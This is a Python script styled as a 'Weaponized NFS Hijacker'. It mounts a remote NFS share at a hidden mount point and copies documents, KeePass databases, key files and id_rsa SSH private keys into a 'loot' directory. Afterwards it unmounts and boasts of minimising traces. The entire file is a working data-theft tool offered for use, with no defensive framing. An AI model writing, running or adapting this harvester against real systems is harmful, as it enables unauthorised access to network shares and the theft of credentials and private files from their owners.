import os
import sys
import subprocess
import shutil

def shadow_mount(remote_path, mount_point="/tmp/.chimera_mnt"):
    """
    Weaponized NFS Hijacker: Mounts remote shares and siphons 
    targeted data types back to the local loot directory.
    """
    if os.geteuid() != 0:
        print("[-] ROOT REQUIRED: Mounting remote shares requires UID 0.")
        sys.exit(1)

    print(f"[*] Attempting Shadow Mount of {remote_path}...")

    # Ensure hidden mount point exists
    if not os.path.exists(mount_point):
        os.makedirs(mount_point)

    try:
        # Attempt an NFS mount with high-performance options
        # 'nolock' and 'tcp' increase stability on unstable networks
        subprocess.run(["mount", "-t", "nfs", "-o", "nolock,tcp", remote_path, mount_point], check=True)
        print(f"[!] SUCCESS: {remote_path} mounted at {mount_point}")

        # Targeted Siphoning Logic
        targets = [".pdf", ".docx", ".xlsx", ".key", ".kdbx", "id_rsa"]
        loot_store = "../../../loot/siphoned_data"
        
        if not os.path.exists(loot_store):
            os.makedirs(loot_store)

        print("[*] Siphoning high-value assets...")
        for root, dirs, files in os.walk(mount_point):
            for file in files:
                if any(file.endswith(ext) for ext in targets):
                    src_path = os.path.join(root, file)
                    dst_path = os.path.join(loot_store, file)
                    # Use shutil.copy2 to preserve metadata (Timestamps)
                    shutil.copy2(src_path, dst_path)
                    print(f"[+] Harvested: {file}")

        # Cleanup: Unmount after siphoning
        subprocess.run(["umount", mount_point], check=True)
        print("[*] Shadow Mount cleared. Traces minimized.")

    except Exception as e:
        print(f"[-] Siphon Fault: {e}")
    finally:
        if os.path.exists(mount_point):
            os.rmdir(mount_point)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo python3 162_shadow_mounter <remote_nfs_ip:/path>")
        sys.exit(1)
    
    shadow_mount(sys.argv[1])
